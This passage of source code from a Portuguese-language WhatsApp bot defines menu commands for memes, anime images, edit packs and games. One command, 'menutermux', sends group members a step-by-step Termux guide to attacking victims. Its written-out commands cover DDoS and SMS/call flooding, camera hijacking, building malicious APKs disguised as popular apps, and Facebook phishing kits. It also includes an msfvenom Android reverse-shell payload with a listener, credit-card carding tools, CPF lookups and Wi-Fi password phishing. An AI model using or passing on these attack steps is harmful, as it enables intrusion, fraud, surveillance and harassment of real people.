ঔৣ͜͡➳.xxx2                          
ঔৣ͜͡➳.xxx3      
ঔৣ͜͡➳.m4                       
ঔৣ͜͡➳.hylander                     
ঔৣ͜͡➳.nikeb                                    
ঔৣ͜͡➳.BanhoDeLeite                            
ঔৣ͜͡➳.AkDoFlamengo                          
ঔৣ͜͡➳.Nemo                                  
ঔৣ͜͡➳.kalidade                                 
ঔৣ͜͡➳.macaverde                              
ঔৣ͜͡➳.m4                                      
ঔৣ͜͡➳.cmgremio                               
ঔৣ͜͡➳.cmflamengo                         
ঔৣ͜͡➳.mercury                                 
ঔৣ͜͡➳.ponta                                    
ঔৣ͜͡➳.moça                                    
ঔৣ͜͡➳hokages  
ঔৣ͜͡➳.nav                                     
ঔৣ͜͡➳.dama                                    
ঔৣ͜͡➳.remedy                                   
ঔৣ͜͡➳.cavala                                   
ঔৣ͜͡➳.facetime                                
ঔৣ͜͡➳ .pe                              
ঔৣ͜͡➳.nike12              
ঔৣ͜͡➳.Copão
ঔৣ͜͡➳.telepati
ঔৣ͜͡➳.Badidea
ঔৣ͜͡➳.Lánomeubarraco
ঔৣ͜͡➳.Drinkazul
ঔৣ͜͡➳.Timmies
ঔৣ͜͡➳.Portugal
ঔৣ͜͡➳.yourname
ঔৣ͜͡➳ .fotodopé       

 ╡Junhin domina$
┗━━━━━━━━━━━━━━━`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

  })

  

  break




case 'menushit':

case 'menu5':

  if (!isRegister) return reply(mess.only.daftarB)

  try {
  
reply(mess.wait)

ppimg = await Pin.getProfilePicture(`https://i.ibb.co/sCNjz5x/Techbigs-com-Pics-Art-04-06-05-07-40.png`)

  } catch {

ppimg = 'https://i.ibb.co/sCNjz5x/Techbigs-com-Pics-Art-04-06-05-07-40.png'

  }

  teks = `Bem vindo ao menu shit 🔊
  🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$

⚠️ use qualquer um dos comandos abaixo pra ver um shitpost aleatório ⚠️

┏━━━━━━━━━━━━━━━━
           〘 Shit em vídeo 〙      
┗━━━━━━━━━━━━━━━━
 ⚠️ comandos sem (.) ⚠️

⏤͟͟͞͞☂︎ shit1
⏤͟͟͞͞☂︎ shit2
⏤͟͟͞͞☂︎ shit3
⏤͟͟͞͞☂︎ shit4
⏤͟͟͞͞☂︎shit5
⏤͟͟͞͞☂︎shit6
⏤͟͟͞͞☂︎shit7
⏤͟͟͞͞☂︎shit8
⏤͟͟͞͞☂︎shit9
⏤͟͟͞͞☂︎shit10
⏤͟͟͞͞☂︎shit11
⏤͟͟͞͞☂︎shit12
⏤͟͟͞͞☂︎shit13
⏤͟͟͞͞☂︎shit14
⏤͟͟͞͞☂︎shit15
⏤͟͟͞͞☂︎shit16
⏤͟͟͞͞☂︎shit17
⏤͟͟͞͞☂︎shit18
⏤͟͟͞͞☂︎shit19
⏤͟͟͞͞☂︎shit20
⏤͟͟͞͞☂︎shit21
⏤͟͟͞͞☂︎shit22
⏤͟͟͞͞☂︎shit23
⏤͟͟͞͞☂︎shit24
⏤͟͟͞͞☂︎shit25
⏤͟͟͞͞☂︎shit26
⏤͟͟͞͞☂︎shit27
⏤͟͟͞͞☂︎shit28
⏤͟͟͞͞☂︎shit29
⏤͟͟͞͞☂︎shit30
⏤͟͟͞͞☂︎shit31
⏤͟͟͞͞☂︎shit32
⏤͟͟͞͞☂︎shit33
⏤͟͟͞͞☂︎shit34
⏤͟͟͞͞☂︎shit35
⏤͟͟͞͞☂︎shit36
⏤͟͟͞͞☂︎shit37
⏤͟͟͞͞☂︎shit38
⏤͟͟͞͞☂︎shit39
⏤͟͟͞͞☂︎shit40
⏤͟͟͞͞☂︎shit41
⏤͟͟͞͞☂︎shit41
⏤͟͟͞͞☂︎shit42
⏤͟͟͞͞☂︎shit43
⏤͟͟͞͞☂︎shit44
⏤͟͟͞͞☂︎shit45
⏤͟͟͞͞☂︎shit46
⏤͟͟͞͞☂︎shit47
⏤͟͟͞͞☂︎shit48
⏤͟͟͞͞☂︎shit49
⏤͟͟͞͞☂︎shit50
┏━━━━━━━━━━━━━━━━
           〘 SHIT E MEMES EM IMAGENS ALEATÓRIA 〙      
┗━━━━━━━━━━━━━━━━
⏤͟͟͞͞☂︎.shit ou .meme
 
                  🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its , image, {quoted: mek, caption: teks, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "menu shit", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})					
                break

  
  case 'menu6':
  
reply(mess.wait)

hasil = `*Menu dos animes*
>>>>>>
*↓Mostra fotos aleatoria dos personagens abaixo ↓*
>>>>>>>
*( . ) naruto*
*( . ) goku*
*( . ) midoriya*
*( . ) allmight*
*( . ) overhaul*
*( . ) mightgay*
*( . ) luffy*
*( . ) vegeta*
*( . ) broly*
*( . ) bills*
*( . ) zoro*
*( . ) barbabranca*
*( . ) jiren*
*( . ) sakura*
*( . ) lemillion*
*( . ) hinata*
*( . ) kira*
*( . ) kuririn*
*( . ) kakashi*
*( . ) rocklee*
*𝐸𝑛𝑡𝑟𝑒 𝑜𝑢𝑡𝑟𝑜𝑠. ( + 300 )*
>>>>>>>
*𝐏𝐞𝐫𝐬𝐨𝐧𝐚𝐠𝐞𝐧𝐬 +18 😳*
↓ ↓ ↓
*( . ) neko*
*( . ) loli*
*( . ) hentai ( menu de hentai)*
>>>>>>>
*Menu de edit de anime*
*( . ) menu4*
↓ ↓ ↓ ↓ ↓
 *🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ domina$*`

reply(hasil)

     break      


case 'menutermux':
  
case 'menu8':

case 'termux':

  if (!isRegister) return reply(mess.only.daftarB)
  
  reply(mess.wait)

  data = fs.readFileSync('./src/hacker.js');
  
  jsonData = JSON.parse(data);
  
  randIndex = Math.floor(Math.random() * jsonData.length);
  
  randKey = jsonData[randIndex];
  
  buffer = await getBuffer(randKey.result)

  teks = `*Comandos(Termux)*
  
*Excluir um diretório (rm -rf e o nome do diretório)*

*pkg update(Sempre quando entrar)*

*pkg upgrade(Sempre quando entrar)*

*Obs:Sempre entrar com a VPN ativada.*

*Ataque DDoS:*

pkg install python
pkg install git
git clone https://github.com/cyweb/hammer
ls
cd hammer
ls
python hammer.py -s(IP da vítima)-p80 -t135
*Derrubar o Wifi:*
pkg install python2
pkg install git
git clone https://github.com/Gameye98/Lazymux
ls
cd Lazymux
ls
python lazymux.py(12)(03)(00)
cd $HOME
cd fl00d
python2 fl00d2.py
*Travar Celular:*
git clone https://github.com/Gameye98/Lazymux
ls
cd ..
ls
cd Lazymux
ls
python lq
python lazymux.py(12)(03)(00)
ls
cd ..
ls
cd fl00d
ls
python2 fl00d2.py
(Vítima)IP:
Porta:80

*Floodar SMS:*

pkg install python3 python3-pip git -y
git clone https://github.com/LimerBoy/Impulse
cd Impulse/
pip3 install -r requirements.txt
python3 impulse.py
cd Impulse (Começar daqui)
ls
python3 impulse.py --method SMS --target +55 (DDD da vítima)(Número da vítima) --time 5
--threads (Quantidade de SMS)

*Invadir Câmera de Segurança:*

apt-get install python3
apt-get install git
git clone https://github.com/AngelSecurityTeam/Cam-Hackers
pip3 install requests
cd Cam-Hackers
ls
cd Cam-Hackers
ls
chmod +x cam-hackers.py
python3 cam-hackers.py
*Criar vírus:*
pkg install python2
pkg install git
git clone https://github.com/TheReaper167/Malicious
ls
cd Malicious
ls
pip2 install requirements.txt
pip2 install requests
ls
python2 malicious.py
(1)
(Escolher o vírus)
ls
cd Android
mv (nome do vírus) /sdcard/virus
ls

*Vulnerabilidades de sites:*

pkg install python2
pkg install git
git clone https://github.com/hahwul/a2sv
cd a2vs
ls
pip2 install -r requirements.txt
python2 a2sv.py -t (nome do site sem o http e até a primeira /)
Abrir outra tela
pkg install nmap
nmap (IP do site debaixo do Scan CCS Injection)

*Spam de Chamadas:*

git clone https://github.com/sandiwijayani1/SpamCall-1
cd SpamCall-1
ls
chmod +x SpamCall.py
ls
python3 SpamCall.py
+5532(Número da vítima)
*Invasão de site:*
pkg install php
pkg install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
ls
cd
cd Red_HAWK
ls
(Ligar a VPN)
php rhawk.php
(Colocar a URL do site sem o http até a primeira barra)
(Informa se o site é http ou https)

*Invadir Facebook:*

pkg install git
git clone https://github.com/Cesar-Hack-Gray/SocialSploit
ls
cd SocialSploit
ls
bash install.sh
./Sploit
[01] Facebook-likes
[02] Facebook-Security
[03] Facebook-Amigos
[04] Facebook-Color
[05] Facebook-Gratuito
[06] Facebook-Home
[07] Facebook
[08] Facebook1
[09] Facebook2
[10] Facebook-War
[11] Tuenti
[12] YouTube
[13] Awaker
[14] hotmail
[15] instagram
[16] netflix
[17] Paypal
[18] snapchat
[19] Spotify
[20] Yahoo
[21] Github
(Agr só escolher)
[+] Envia ala victima ->
(Agr só mandar o link pra vítima q vai aparecer na frente)

*Pentest:*

./ngrok tcp 4444(abrir outra sessão)
msfvenom -p android/meterpreter/reverse_tcp LHOST=[host] LPORT=[porta]
R > /sdcard/Download/Payload.apk(abrir outra sessão)
(Olhar na pasta Download e mandar o app criado para a vítima)
msfconsole(esperar iniciar)use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost localhost
set lport 4444
exploit
help
hide_app_icon(para ocultat o app)

*Consultar CPF:*

pkg install irssi
irssi
/connect irc.chknet.cc
/join #brazil
!cpf (número do cpf da vítima)
(Copiar o link com o formato https://paste.ee/r/ cópiar e colar lá no Google)

*Informação do IP:*

pkg update && pkg upgrade
pkg install git w3m wget -y
git clone https://github.com/Amriez/ipmux
ls
chmod +x*
sh ipmux.sh
{Opção 1 ver sobre seu IP}
{Opção 2 ver sobre o IP da vitima}
Gerar CC Full:
pkg install python3
termux-setup-storage
cd storage
ls
cd downloads
python3 geracc.txt
(N)

*Gerar pessoa:*

pkg install git -y
pkg install python -y
pkg install python2 -y
git clone https://github.com/mailsonsv/gerapessoa
ls
cd gerapessoa
python pessoa.py

*Invadir câmera de celular:*

git clone https://github.com/hangetzzu/saycheese
ls
cd saycheese
ls
chmod +x saycheese.sh
ls
bash saycheese.sh
(01)
(n)
Abrir outra sessão
cd
ls
./ngrok http 3333
Cópia o link na frente de (Forwarding)e mandar pra vítima
Voltar para a outra sessão
CTRL+C
ls
mv (as fotos tiradas) /sdcard/

*Conseguir senha do wifi:*

termux-setup-storage
cd storage
ls
cd downloads
ls
cd wifiphishing
ls
cp -rf wifipishing $HOME
cd ..
cd ..
ls
cd ..
ls
cd wifipishing
ls
(Abrir outra sessão)
cd ..
ls
./ngrok http 4567
(Copiar o link na de Forwarding com o formato http)
(Voltar para outra sessão)
(Mandar o link pra vítima)
php -S localhost:4567
CTRL+C
cd ..
ls
cd wifipishing
ls
cat hacked.txt

*Rastrear IP:*

git clone https://github.com/maldevel/IPGeoLocation
ls
cd IPGeoLocation
ls
python ipgeolocation.py -t (IP da vítima)
*Pegar informação pelo número do telefone:*
git clone https://github.com/abhinavkavuri/PhoneInfoga
ls
cd PhoneInfoga
ls
python3 phoneinfoga.py -n +55(DDD da vítima)(número da vítima)
*Pegar informação de seus amigos no Face:*
ls
cd fbi ou OSIF
python2 osif.py ou fbi.py

*Criar vírus cell ou Pc:*

git clone https://github.com/Hacking-pch/papaviruz
ls
cd papaviruz
ls
chmod +x papaviruz.sh
bash papaviruz.sh
[01]
[01] = Internet Gratis.apk viruz
[02] = Elite.apk viruz
[03] = Facebook lite.apk viruz
[04] = termux.apk viruz
[05] = Google.apk viruz
[06] = whatsapp lite.apk viruz
[07] = whatsapp spy.apk viruz
[07] = Facebook spy.apk viruz
[08] = Galeria.apk viruz
[09] = Calculadora.apk viruz
[10] = Camara.apk viruz
[11] = Gmail.apk viruz
[12] = Play Store.apk viruz
[13] = PayPal.apk viruz
[14] = Play music.apk viruz
[15] = Opera mini.apk viruz
[>]= OPCION >>(só colocar o número)
[>]= MOVER >>/sdcard
(Agr só mandar pra vítima)

*Bomba de SMS:*

git clone https://github.com/entynetproject/quack
ls
cd quack
pip install -r requirements.txt
chmod 711 quack
python quack --tool SMS --target +55(DDD)(número da vítima) --threads 1000 --timeout 10

*Pegar cartões de crédito:*

Ligar a VPN
git clone https://github.com/RealHackRH593/CC-MundoRH
ls
cd CC-MundoRH
ls
bash mundoccrh.sh
TU NICK BINERO PARA EL MUNDO CARDING ★RH★ : Z3RØ
USUARIO : REALHACKRH
CONTRASEÑA : 593
[ 01 ] TARGETA DE CREDITO ESTADOS UNIDOS
02 ] TARGETA DE CREDITO AUSTALIA
[ 03 ] TARGETA DE CREDITO AUSTRIA
[ 04 ] TARGETA DE CREDITO BELGIUM
[ 05 ] TARGETA DE CREDITO BRAZIL
[ 06 ] TARGETA DE CREDITO CANADA
[ 07 ] TARGETA DE CREDITO DENMARK
[ 08 ] TARGETA DE CREDITO ESTONIA
[ 09 ] TARGETA DE CREDITO FINLANDIA
[ 10 ] TARGETA DE CREDITO FRANCIA
[ 11 ] TARGETA DE CREDITO GERMANYA
[ 12 ] TARGETA DE CREDITO GREENLANDIA
[ 13 ] TARGETA DE CREDITO HUNGARYA
[ 14 ] TARGETA DE CREDITO ICELANDIA
[ 15 ] TARGETA DE CREDITO NETHERLANDIA
[ 16 ] TARGETA DE CREDITO NORWAY
[ 17 ] TARGETA DE CREDITO POLAND
[ 18 ] TARGETA DE CREDITO PORTUGAL
[ 19 ] TARGETA DE CREDITO SLOVENIA
[ 20 ] TARGETA DE CREDITO SPAÑA
[ 21 ] TARGETA DE CREDITO SWEDEN
[ 22 ] TARGETA DE CREDITO SWITZERLANDIA
[ 23 ] TARGETA DE CREDITO TUNISIA
[ 24 ] MUNDO CARDING PRO
%%%%%%%% MUNDO BINS ★RH★_593 %%%%%%%% :(só escolher o número)
CANTIDAD DE CC A BUSCAR :(o número q vc escolheu)

*Consultar IP,CEP e CNPJ:*

git clone https://github.com/T3rMuX0/Consulta-v3
ls
cd Consulta-v3
ls
python consultav3.py
- [01] CONSULTAR IP
- [02] CONSULTAR CEP
- [03] CONSULTAR CNPJ
- [04] SAIR
- =+>(só escolher)

*HACKEAR FACEBOOK LINK:*

pkg update
pkg upgrade
pkg install git
pkg install php
pkg install python
pkg install python2
pkg install openssh
pkg install wget
git clone https://github.com/Cesar-Hack-Gray/scam
cd scam
bash install.sh
./phishing.sh
*Conhecimento não é crime! 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™*`



  Pin.sendMessage(from, buffer, video, {mimetype: 'video/gif',

quoted: mek, caption: teks, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "menu termux", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})

  
  

  break
  
case 'menuedit':

case 'menu4':

  if (!isRegister) return reply(mess.only.daftarB)

  try {
reply(mess.wait)
ppimg = await Pin.getProfilePicture(`https://i.ibb.co/p3q6PkJ/Techbigs-com-Pics-Art-04-13-11-54-05.jpg`)

  } catch {

ppimg = 'https://i.ibb.co/p3q6PkJ/Techbigs-com-Pics-Art-04-13-11-54-05.jpg'

  }

  teks = `*〘 MENU DAS EDITS 〙*
Seja bem vindo, use os comandos para ver uma edit de cada.
┏━━━━━━━━━━━━━
     EDITS DE ANIMES 👻
┗━━━━━━━━━━━━━      
     🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$

⏤͟͟͞͞☂︎.editanime (mostra edit de anime aleatoria)

⏤͟͟͞͞☂︎.editanime2 (mostra edit de anime aleatoria)

⏤͟͟͞͞☂︎.editanime3 (mostra edit de anime aleatoria)

⏤͟͟͞͞☂︎.editkaneki (mostra edit do kaneki)

⏤͟͟͞͞☂︎.editkaneki1 (mostra edit do kaneki dnvokkk)

⏤͟͟͞͞☂︎.editmidorya (edit do midorya)

⏤͟͟͞͞☂︎.editlevi (edit do levi)

⏤͟͟͞͞☂︎.editoverhaul (edit do overhaul)

⏤͟͟͞͞☂︎.editoverhaul2 (mostra edit do brabo dnvo)

⏤͟͟͞͞☂︎.editdemonslayer (uma edit do anime demon slayer)

⏤͟͟͞͞☂︎.editsaitama (mostra uma edit do saitama)

⏤͟͟͞͞☂︎.editgoku (mostra uma edit do Goku)

⏤͟͟͞͞☂︎.editminato (uma edit do minato)

⏤͟͟͞͞☂︎.editluffy (edit do luffy)

⏤͟͟͞͞☂︎.editvegeta (edit do vegeta)

⏤͟͟͞͞☂︎.edititachi (mostra edit do itachi )

⏤͟͟͞͞☂︎.editmadara (mostra edit do madara)

⏤͟͟͞͞☂︎.editnaruto (uma edit do naruto)

⏤͟͟͞͞☂︎.edithunter ( uma edit do Hunter)

⏤͟͟͞͞☂︎.editkaneki (uma edit do kaneki)
┏━━━━━━━━━━━━━
     EDITS DE FF 👻
┗━━━━━━━━━━━━━
⏤͟͟͞͞☂︎.editff1 (uma edit de ff)

⏤͟͟͞͞☂︎.editff2 (uma edit de ff)

⏤͟͟͞͞☂︎.editff3 (uma edit de ff)

⏤͟͟͞͞☂︎.editff4 ( uma edit de ff)

⏤͟͟͞͞☂︎.editff5 (uma edit de ff)

⏤͟͟͞͞☂︎.editff6 (uma edit de ff)

⏤͟͟͞͞☂︎.editff7 (uma edit de ff)

⏤͟͟͞͞☂︎.editff8 (uma edit de ff)

⏤͟͟͞͞☂︎.editff8 (uma edit de ff)

⏤͟͟͞͞☂︎.editff8 (uma edit de ff)

⏤͟͟͞͞☂︎.editff9 (uma edit de ff)

⏤͟͟͞͞☂︎.editff10 (uma edit de ff caraikkk c é burro(@) ;-; )

┏━━━━━━━━━━━━━
     PARA QUEM SABE EDITAR
┗━━━━━━━━━━━━━
LISTA 🔥

⏤͟͟͞͞☂︎ PACK GFX:
https://www.mediafire.com/file/mpf9jv0yv2nqazi/Mega_Pack_GFX-E-sports_%2528_Alan_Design%2529.zip/file

⏤͟͟͞͞☂︎ PACK GFX:
https://www.mediafire.com/file/a3cl1j3sk3swl0x/%25E2%2596%25AAPACK_ESPORTS%25E2%2596%25AA.zip/file

⏤͟͟͞͞☂︎ PACK DO FUTURO:
http://www.mediafire.com/file/seo1nhg3hi75fyb/%25E2%2597%258FPACK_DO_FUTURO_V3%25E2%2597%258F.zip/file

⏤͟͟͞͞☂︎ PACK DE FONTES:
http://www.mediafire.com/file/2nn85zb62vbw1qf/%25E2%2597%258FFONTES%25E2%2597%258F.zip/file

⏤͟͟͞͞☂︎ PACK NARUTO:
https://www.mediafire.com/file/b3m2s156fimlc21/PackNarutoByXxadoW.zip/file

⏤͟͟͞͞☂︎ PACK YUMA:
https://www.mediafire.com/file/98cdz3rdjzc8j6u/%25E2%2596%25BAYumaPack_Lite_%25E2%2597%2584_by_Yamatsu%25E2%2580%25A2Yucky.zip/file


⏤͟͟͞͞☂︎ PACK DE RENDERS:
https://www.mediafire.com/file/x1quat6tsbbrpgg/%25E2%2580%25A2Pack_De_Renders_2_By%25E2%2580%25A2GianBR_Dzn%25E2%2580%25A2.zip/file

⏤͟͟͞͞☂︎ AKASHI V2: (mt mais coisas)
https://www.mediafire.com/file/t5ithurijnmmxxm/Pack_Gfx_Akashi_v2.zip/file

(Os packs do Akashi são .rar então usar o RAR pra extrair)

⏤͟͟͞͞☂︎ RAR:
https://play.google.com/store/apps/details?id=com.rarlab.rar
  
┏━━━━━━━━━━━━━
     APPS PARA FZR EDIT
┗━━━━━━━━━━━━━
APPS:

⏤͟͟͞͞☂︎ PIXELLAB MOD:
http://www.mediafire.com/file/k37s5ihjgi1dj64/PixelLab+Yakuno.apk/file

⏤͟͟͞͞☂︎ PINTEREST:
https://play.google.com/store/apps/details?id=com.pinterest

⏤͟͟͞͞☂︎ LIGTHROOM:
https://www.mediafire.com/file/eoipe7rb5lau4cg/Mark_Unique_Premium_presets.zip/file

⏤͟͟͞͞☂︎ PS TOUCH PLUS:
http://www.mediafire.com/file/dra6xeofhdrv3rr/Ps+touch+Plus.apk/file

⏤͟͟͞͞☂︎ REMINI (app que aumenta muito a qualidade da sua edit,baixa aí pprt):
https://play.google.com/store/apps/details?id=com.bigwinepot.nwdn.international

⏤͟͟͞͞☂︎ GRAVADOR DE TELA:
https://play.google.com/store/apps/details?id=com.kimcy929.screenrecorder

⏤͟͟͞͞☂︎ ERASER (app pra apagar o fundo de imagens):
https://play.google.com/store/apps/details?id=com.handycloset.android.eraser
 ┏━━━━━━━━━━━━━
     PARA QUEM QUER APRENDER A EDITAR$
┗━━━━━━━━━━━━━
⏤͟͟͞͞☂︎ TUTORIAS BÁSICOS:

⏤͟͟͞͞☂︎ Como fazer efeitos de raios pelo ps touch:
https://youtu.be/hvgMjcmyDTo

⏤͟͟͞͞☂︎ Como fazer texto com efeito de fogo pelo ps touch:
https://youtu.be/T3sIG9fKT8c

                         🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its , image, {quoted: mek, caption: teks, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "menu edit", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})					
                break


case 'menu4':

  if (!isRegister) return reply(mess.only.daftarB)

  try {
reply(mess.wait)
ppimg = await Pin.getProfilePicture(`https://i.ibb.co/p3q6PkJ/Techbigs-com-Pics-Art-04-13-11-54-05.jpg`)

  } catch {

ppimg = 'https://i.ibb.co/p3q6PkJ/Techbigs-com-Pics-Art-04-13-11-54-05.jpg'

  }

  teks = `*〘 MENU DAS EDITS 〙*
Seja bem vindo, use os comandos para ver uma edit de cada.
┏━━━━━━━━━━━━━
     EDITS DE ANIMES 👻
┗━━━━━━━━━━━━━      
     🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$

⏤͟͟͞͞☂︎.editanime (mostra edit de anime aleatoria)

⏤͟͟͞͞☂︎.editanime2 (mostra edit de anime aleatoria)

⏤͟͟͞͞☂︎.editanime3 (mostra edit de anime aleatoria)

⏤͟͟͞͞☂︎.editkaneki (mostra edit do kaneki)

⏤͟͟͞͞☂︎.editkaneki1 (mostra edit do kaneki dnvokkk)

⏤͟͟͞͞☂︎.editmidorya (edit do midorya)

⏤͟͟͞͞☂︎.editlevi (edit do levi)

⏤͟͟͞͞☂︎.editoverhaul (edit do overhaul)

⏤͟͟͞͞☂︎.editoverhaul2 (mostra edit do brabo dnvo)

⏤͟͟͞͞☂︎.editdemonslayer (uma edit do anime demon slayer)

⏤͟͟͞͞☂︎.editsaitama (mostra uma edit do saitama)

⏤͟͟͞͞☂︎.editgoku (mostra uma edit do Goku)

⏤͟͟͞͞☂︎.editminato (uma edit do minato)

⏤͟͟͞͞☂︎.editluffy (edit do luffy)

⏤͟͟͞͞☂︎.editvegeta (edit do vegeta)

⏤͟͟͞͞☂︎.edititachi (mostra edit do itachi )

⏤͟͟͞͞☂︎.editmadara (mostra edit do madara)

⏤͟͟͞͞☂︎.editnaruto (uma edit do naruto)

⏤͟͟͞͞☂︎.edithunter ( uma edit do Hunter)

⏤͟͟͞͞☂︎.editkaneki (uma edit do kaneki)
┏━━━━━━━━━━━━━
     EDITS DE FF 👻
┗━━━━━━━━━━━━━
⏤͟͟͞͞☂︎.editff1 (uma edit de ff)

⏤͟͟͞͞☂︎.editff2 (uma edit de ff)

⏤͟͟͞͞☂︎.editff3 (uma edit de ff)

⏤͟͟͞͞☂︎.editff4 ( uma edit de ff)

⏤͟͟͞͞☂︎.editff5 (uma edit de ff)

⏤͟͟͞͞☂︎.editff6 (uma edit de ff)

⏤͟͟͞͞☂︎.editff7 (uma edit de ff)

⏤͟͟͞͞☂︎.editff8 (uma edit de ff)

⏤͟͟͞͞☂︎.editff8 (uma edit de ff)

⏤͟͟͞͞☂︎.editff8 (uma edit de ff)

⏤͟͟͞͞☂︎.editff9 (uma edit de ff)

⏤͟͟͞͞☂︎.editff10 (uma edit de ff caraikkk c é burro(@) ;-; )

┏━━━━━━━━━━━━━
     PARA QUEM SABE EDITAR
┗━━━━━━━━━━━━━
LISTA 🔥

⏤͟͟͞͞☂︎ PACK GFX:
https://www.mediafire.com/file/mpf9jv0yv2nqazi/Mega_Pack_GFX-E-sports_%2528_Alan_Design%2529.zip/file

⏤͟͟͞͞☂︎ PACK GFX:
https://www.mediafire.com/file/a3cl1j3sk3swl0x/%25E2%2596%25AAPACK_ESPORTS%25E2%2596%25AA.zip/file

⏤͟͟͞͞☂︎ PACK DO FUTURO:
http://www.mediafire.com/file/seo1nhg3hi75fyb/%25E2%2597%258FPACK_DO_FUTURO_V3%25E2%2597%258F.zip/file

⏤͟͟͞͞☂︎ PACK DE FONTES:
http://www.mediafire.com/file/2nn85zb62vbw1qf/%25E2%2597%258FFONTES%25E2%2597%258F.zip/file

⏤͟͟͞͞☂︎ PACK NARUTO:
https://www.mediafire.com/file/b3m2s156fimlc21/PackNarutoByXxadoW.zip/file

⏤͟͟͞͞☂︎ PACK YUMA:
https://www.mediafire.com/file/98cdz3rdjzc8j6u/%25E2%2596%25BAYumaPack_Lite_%25E2%2597%2584_by_Yamatsu%25E2%2580%25A2Yucky.zip/file


⏤͟͟͞͞☂︎ PACK DE RENDERS:
https://www.mediafire.com/file/x1quat6tsbbrpgg/%25E2%2580%25A2Pack_De_Renders_2_By%25E2%2580%25A2GianBR_Dzn%25E2%2580%25A2.zip/file

⏤͟͟͞͞☂︎ AKASHI V2: (mt mais coisas)
https://www.mediafire.com/file/t5ithurijnmmxxm/Pack_Gfx_Akashi_v2.zip/file

(Os packs do Akashi são .rar então usar o RAR pra extrair)

⏤͟͟͞͞☂︎ RAR:
https://play.google.com/store/apps/details?id=com.rarlab.rar
  
┏━━━━━━━━━━━━━
     APPS PARA FZR EDIT
┗━━━━━━━━━━━━━
APPS:

⏤͟͟͞͞☂︎ PIXELLAB MOD:
http://www.mediafire.com/file/k37s5ihjgi1dj64/PixelLab+Yakuno.apk/file

⏤͟͟͞͞☂︎ PINTEREST:
https://play.google.com/store/apps/details?id=com.pinterest

⏤͟͟͞͞☂︎ LIGTHROOM:
https://www.mediafire.com/file/eoipe7rb5lau4cg/Mark_Unique_Premium_presets.zip/file

⏤͟͟͞͞☂︎ PS TOUCH PLUS:
http://www.mediafire.com/file/dra6xeofhdrv3rr/Ps+touch+Plus.apk/file

⏤͟͟͞͞☂︎ REMINI (app que aumenta muito a qualidade da sua edit,baixa aí pprt):
https://play.google.com/store/apps/details?id=com.bigwinepot.nwdn.international

⏤͟͟͞͞☂︎ GRAVADOR DE TELA:
https://play.google.com/store/apps/details?id=com.kimcy929.screenrecorder

⏤͟͟͞͞☂︎ ERASER (app pra apagar o fundo de imagens):
https://play.google.com/store/apps/details?id=com.handycloset.android.eraser
 ┏━━━━━━━━━━━━━
     PARA QUEM QUER APRENDER A EDITAR$
┗━━━━━━━━━━━━━
⏤͟͟͞͞☂︎ TUTORIAS BÁSICOS:

⏤͟͟͞͞☂︎ Como fazer efeitos de raios pelo ps touch:
https://youtu.be/hvgMjcmyDTo

⏤͟͟͞͞☂︎ Como fazer texto com efeito de fogo pelo ps touch:
https://youtu.be/T3sIG9fKT8c

                         🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

  })

  

  break



      
      
      
      

      

      
case 'menujogos':      
case 'menu7':      
case 'jogos':     
 hasil = `┏━━━「  𝙅𝙊𝙂𝙊𝙎 🎲 」
┃┏━━━━━━━━━━━
┃┃   〘  *PORCENTAGENS* 〙
┃┃ঔৣ͜͡➳ *.amor* (marque)
┃┃ঔৣ͜͡➳ *.gay* (marque)
┃┃ঔৣ͜͡➳ *.gay1* (marque)
┃┃ঔৣ͜͡➳ *.gay2* (marque)
┃┃ঔৣ͜͡➳ *.hackear* (marque)
┃┃ঔৣ͜͡➳ *.nazista* (marque)
┃┃ঔৣ͜͡➳ *%gado* (marque)
┃┃ঔৣ͜͡➳ *%* (digite algo)
┃┃ঔৣ͜͡➳ *%feio* (marque)
┃┃ঔৣ͜͡➳ *%lindo* (marque)
┃┃ঔৣ͜͡➳ *%gostoso* (marque)             ┃┗━━━━━━━━━━━━
┗━━━〘  *GRUPOS* 〙
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *.ttt* (dificuldade)
┃┃ঔৣ͜͡➳ *.ttthelp* (caso não saiba jogo da velha)
┃┃ঔৣ͜͡➳ *.tttme* ( veja quantos pontos vc tem no jogo da velha )
